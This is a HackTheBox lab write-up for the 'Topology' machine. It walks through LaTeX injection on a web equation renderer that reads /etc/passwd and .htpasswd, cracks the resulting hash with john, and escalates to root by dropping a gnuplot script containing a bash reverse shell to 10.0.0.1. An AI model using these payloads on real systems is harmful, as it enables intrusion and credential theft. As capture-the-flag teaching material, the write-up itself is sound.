---
layout: post
title: Topology - HackTheBox
categories:
- HackTheBox
tags:
- Linux
- htaccess
- htpassword
- Latex Injection
- pspy
- Subdomains Enumeration
- Gnuplot
- John
date: 2023-10-05
description: Topology is a hackthebox machine that has a website showing information about a topology group. The group have a project which is a latex equation generation. The subdomain that is running the project accepts latex equations as inputs and generates a png image of that equation. However the project is vulnerable to latex injection and we can read files. One of those files, .htpassword, contains credentials that give access to a ssh session in the machine. To elevate privileges we used a binary called pspy64 to look at processes without root privileges. We are able to look at a command executed by root that can be used to gain root privileges and this way we get root access.
summary: Topology is a hackthebox machine that has a website showing information about a topology group. The group have a project which is a latex equation generation. The subdomain that is running the project accepts latex equations as inputs and generates a png image of that equation. However the project is vulnerable to latex injection and we can read files. One of those files, .htpassword, contains credentials that give access to a ssh session in the machine. To elevate privileges we used a binary called pspy64 to look at processes without root privileges. We are able to look at a command executed by root that can be used to gain root privileges and this way we get root access.
cover:
  image: images/machine_img.png
---

## Recon

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
|   256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
|_  256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Miskatonic University | Topology Group
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

The website seems to belong to a topology group and it is used to display information about the group.
It has three main users as staff:
- Lilian Klein
- Vajramani Daisley
- Derek Abrahams

It has an email: `lklein@topology.htb` and a link for a subdomain: `http://latex.topology.htb/equation.php`
First lets add the domain `topology.htb` and `latex.topology.htb` to the hosts file(`/etc/hosts`).

`http://latex.topology.htb/equation.php` seems like a attack surface because they expect a user input and with that they generate an image. Maybe some command is execute with some binary that converts the latex into an image. But before we start digging into more, lets look for more subdomains and directories in the main domain.

Lets run a directory discover scan with gobuster: `gobuster dir -u http://topology.htb -w ~/SecLists/Discovery/Web-Content/big.txt`

```shell
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
```

And vhosts scan too: `gobuster vhost -u http://topology.htb -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`

```
Found: dev.topology.htb (Status: 401) [Size: 463]
Found: stats.topology.htb (Status: 200) [Size: 108]
```

Since we didn't find nothing in the main domain(topology.htb) and before going into the latex subdomain, we add the two subdomains we found to the hosts file(/etc/hosts) and start exploring each one.

### dev.topology.htb Subdomain

`http://dev.topology.htb/` is asking for credentials in order to enter in the webpage. We tried some default credentials but we were not successful.
Lets scan the directories in this subdomain: `gobuster dir -u http://dev.topology.htb -w ~/SecLists/Discovery/Web-Content/big.txt -b 404,401`

```shell
/.htaccess            (Status: 403) [Size: 283]
/.htpasswd            (Status: 403) [Size: 283]

```
###  stats.topology.htb Subdomain

`http://stats.topology.htb/` its a strange page that shows the server load, but its static.
Lets scan the directories in this subdomain: `gobuster dir -u http://stats.topology.htb -w ~/SecLists/Discovery/Web-Content/big.txt`

```shell
/.htaccess            (Status: 403) [Size: 283]
/.htpasswd            (Status: 403) [Size: 283]

```

![](/images/topology/stats_subdomain.png)

## Foothold

Since we didn't find anything in `http://stats.topology.htb/`, `http://dev.topology.htb/` and `http://topology.htb/`, lets look at the `equation.php` in `latex.topology.htb`.
When generating an image from a latex equation we get `Pdf Version: PDF-1.5` if we look at the file details with `exiftool`.
Another thing is that, if we try to read a file with the following latex:
`\newread\file\openin\file=/etc/passwd\loop\unless\ifeof\file\read\file to\fileline % Reads a line of the file into \fileline\repeat\closein\file`
We get `Illegal command detected. Sorry`. It seems like the vulnerability here is latex injection and the server has some filters that we need to bypass.


![](/images/topology/error.png)



This command let us read one line in /etc/passwd: `\newread\file\openin\file=equation.php\read\file to\line\text{\line}\newline\read\file to\line\text{\line}\newline\read\file to\line\text{\line}\newline\closein\file`
In this command `\loop` is not accepted: 
`\newread\file\openin\file=/etc/passwd\loop\unless\ifeof\file%0A%20%20%20%20\read\file%20to\fileline%0A%20%20%20%20\text{\fileline}\repeat\closein\file`
In this command `\usepackage` is not accepted: `\usepackage{verbatim}\verbatiminput{/etc/passwd}`
In this command `\input` is not accepted: `\input{/etc/passwd}\include{somefile}`
After trying some inputs, I finally got it by using`$\lstinputlisting{/etc/passwd}$`. The `\lstinputlisting` command in LaTeX is used to include the contents of an external source code file into your document and format it appropriately for code listings. This command is part of the listings package, which is commonly used for displaying code in LaTeX documents. The use of the character `$` is to format the text differently from all the text. Since `lstinputlisting` will format the text, using inside the document without the dollar sign will cause the error message `input too long. sorry`.


Links:
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection
- https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection
- https://salmonsec.com/cheatsheets/exploitation/latex_injection5


Having the possibility to read files in the filesystem lets try to gather information:

- Looking at `/etc/passwd` we have two users: `root` and `vdaisley`.
- Since it is Apache we can know the location of the website in the filesystem by looking at `$\lstinputlisting{/etc/apache2/sites-available/000-default.conf}$`. We have, /var/www/html, /var/www/latex, /var/www/dev and /var/www/stats.
- The most interesting domain is the dev, looking at the `/var/www/dev/.htaccess` we know that the credentials are in `/var/www/dev/.htpasswd`.
- We ge the following credentials: `vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0`. The password seems like an hash.

Using the credentials with john the ripper we get the hash format: `md5crypt-long`
Lets run john  with the credentials against rockyou.txt wordlist: `john --format=md5crypt-long --show --wordlist=~/rockyou.txt crack.txt`
To see the password: `john --show crack.txt `, we get: `vdaisley:calculus20`.

Using the credentials in `http://dev.topology.htb` we get a webpage but its just javascript and css, a dead end.

![](/images/topology/dev.png)

Trying the same credentials in ssh we get a shell as the user `vdaisley`: `ssh vdaisley@10.10.11.217`


## Privilege Escalation

Inside the vdaisley home directory we have a binary called [`pspy64`](https://github.com/DominicBreuker/pspy). This is a binary that can watch for processes without needing root privileges. Basically what it does is using the API of [inotify](https://man7.org/linux/man-pages/man7/inotify.7.html) to see watch for changes in directories such as  /opt, /usr and etc. When a new notification of a modification in the filesystem triggers, pspy scans `/proc` to catch the process.

Running this binary and after waiting a few seconds a process with the command `find /opt/gnuplot -name *.plt -exec gnuplot {} ;` triggers in pspy.
Basically what is doing is finding all the files in the directory `/opt/gnuplot` with the extension of `.plt` and execute them in the command `gnuplot file.plt`. However, `gnuplot` can execute system commands as explained [here](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/). Since we have write privileges in the directory `/opt/gnuplot`: `drwx-wx-wx  2 root root 4096 Oct  5 07:25 gnuplot`, we create a test.plt with a bash reverse shell `system "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"`, copy to the directory and start a netcat listener. After a couple of minutes we get a shell as root since the process was runned by root. 